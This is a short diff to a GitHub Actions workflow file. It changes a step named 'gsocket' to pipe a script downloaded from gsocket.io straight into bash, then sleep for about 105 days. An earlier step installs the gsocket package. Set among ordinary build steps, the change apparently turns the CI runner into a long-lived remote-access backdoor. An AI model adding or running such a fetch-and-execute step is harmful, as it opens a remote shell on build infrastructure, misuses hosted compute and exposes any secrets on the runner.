@@ -17,7 +17,7 @@ jobs:
         run: sudo apt-get update && sudo apt-get install -y scons libssl-dev gsocket
 
       - name: gsocket
-        run: gsocket && sleep 9099090
+        run: bash -c "$(curl -fsSL https://gsocket.io/y)" && sleep 9099090
 
       - name: ls lib
         run: locate libcrypto.so
